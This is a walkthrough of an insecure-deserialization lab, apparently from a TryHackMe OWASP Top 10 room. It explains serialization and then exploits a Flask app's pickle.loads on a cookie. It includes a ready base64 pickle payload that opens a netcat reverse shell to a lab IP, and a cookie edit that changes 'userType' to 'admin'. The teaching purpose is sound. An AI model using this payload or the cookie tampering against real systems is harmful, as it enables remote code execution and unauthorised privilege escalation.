--- ---

- **The Exploit** (Example)

	Now I'm not going to leave you hanging dry here. First, we need to set up a netcat listener on our Kali. If you are a subscriber, you can control your own [in-browser TryHackMe Kali Machine](https://tryhackme.com/my-machine).

	![](https://i.imgur.com/Ftsfnq0.png)

	Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed. I will be detailing the steps below with provided material to do so.  

	Once this is complete, [copy-and-paste the source code from this python file (pickelme.py)](https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py) to your kali and modify the source code to replace your "YOUR_IP" with your IP. [This can be obtained via the Access page](https://tryhackme.com/access).

	1. Create a python file to paste into, I have used "rce.py" for these examples:

	![](https://i.imgur.com/k93pazM.png)

	2. Paste the code from the GitHub site, replacing IP with your IP from the access page

	![](https://i.imgur.com/gfR2lcf.png)

	3. Execute "rce.py" via `python3 rce.py`

	4. Note the output of the command, it will look something similar to this:

	![](https://i.imgur.com/67OUbwN.png)

	5. Copy and paste everything in-between the two speech marks ('DATA'). In my case, I will copy and paste:
	'gASVcgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFdybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTEuMy4yIDQ0NDQgPiAvdG1wL2aUhZRSlC4=`    Yours may look slightly different, just ensure that you copy everything in-between the two speech marks `''`

	6. Paste this into the "encodedPayload" cookie in your browser:

	![](https://i.imgur.com/fZDayjD.png)  

	7. Ensure our netcat listener is still running:

	![](https://i.imgur.com/Ftsfnq0.png)

	8. Refresh the page. It will hang, refer back to your netcat listener:

	![](https://i.imgur.com/WESTagT.png)  

	If you have performed the steps correctly, you will now have a remote shell to your instance. No privilege escalation involved, look for the flag.txt flag!

---

<h2>What is Deserialization & Serialization?</h2>

**Deserialization** is the process of reconstructing a data structure or object from a series of bytes or a string in order to instantiate the object for consumption. This is the reverse process of serialization, i.e., converting a data structure or object into a series of bytes for storage or transmission across devices. To fetch an object state over a wire or read it from persistent storage, a system must be able to deserialize it from raw bytes.

![Deserialization Diagram](https://hazelcast.com/wp-content/uploads/2021/12/deserialization-diagram-800x367-1.png)

Data deserialization is the process of building a data object from a stream of bytes.

![Serialization-Deserialization Diagram](https://hazelcast.com/wp-content/uploads/2021/12/serialization-deserialization-diagram-800x318-1.png)

Serialization and deserialization work together to transform/recreate data objects to/from a portable format.


- **What does this mean?**

	Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.

	![](https://i.imgur.com/ZB76mLI.png)

	Insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.


- **Privilege Escalation from Cookies**

	![](https://i.imgur.com/P8o62li.png)

	Where you will be directed to your profile page. Notice on the right, you have your details.

	![](https://i.imgur.com/6fYd0td.png)

	Right-Click the Page and press "Inspect Element". Navigate to the "Storage" tab.

	![](https://i.imgur.com/1LMFfV0.png)  

  
- **Inspecting Encoded Data**

	You will see here that there are cookies are both plaintext encoded and base64 encoded. The first flag will be found in one of these cookies.


- **Modifying Cookie Values**

	Notice here that you have a cookie named "userType". You are currently a user, as confirmed by your information on the "myprofile" page.

	This application determines what you can and cannot see by your userType. What if you wanted to be come an admin?

	Double left-click the "Value" column of "userType" to modify the contents. Let's change our userType to "admin" and navigate to http://10.10.12.109/admin to answer the second flag.

- **Code Execution from Cookies**

	![](https://i.imgur.com/FwG0TBs.png)


- **What makes this form vulnerable?**

	If a user was to enter their feedback, the data will get encoded and sent to the Flask application (presumably for storage within a database for example). However, the application assumes that any data encoded is trustworthy. But we're hackers. You can only trust us as far as you can fling us (and that's nigh-on impossible online)  

	Although explaining programming is a bit out of scope for this room, it's important to understand what's going on in the snippet below:

	![](https://i.imgur.com/lgomAL9.png)  

	When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your browser - perfect for us to modify! Once you visit the feedback form, the value of this cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the cookie is retrieved and then deserialized via `pickle.loads`

	![](https://i.imgur.com/8id81K3.png)

	This vulnerability exploits Python Pickle, which I have attached as reading material at the end of the room. We essentially have free reign to execute whatever we like such as a reverse shell.  